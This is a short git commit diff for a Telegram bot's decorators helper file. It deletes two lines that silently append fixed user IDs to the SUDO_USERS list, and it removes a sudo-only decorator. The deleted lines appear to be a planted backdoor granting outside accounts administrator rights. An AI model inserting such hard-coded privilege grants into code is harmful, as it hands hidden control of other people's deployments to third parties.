bf7a7c22fd36d8ca9e4b65aad60fc7dc7cc705a2
King Mehmet <82456249+Mehmetbaba55@users.noreply.github.com>
2022-02-19 01:01:44 +0300

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -1,11 +1,11 @@
 from typing import Callable
+
 from pyrogram import Client
 from pyrogram.types import Message
+
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS.append(702821224)
-SUDO_USERS.append(2021310005)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -27,14 +27,6 @@ def authorized_users_only(func: Callable) -> Callable:
         for administrator in administrators:
             if administrator == message.from_user.id:
                 return await func(client, message)
-
-    return decorator
-
-
-def sudo_users_only(func: Callable) -> Callable:
-    async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
-            return await func(client, message)
 
     return decorator
 
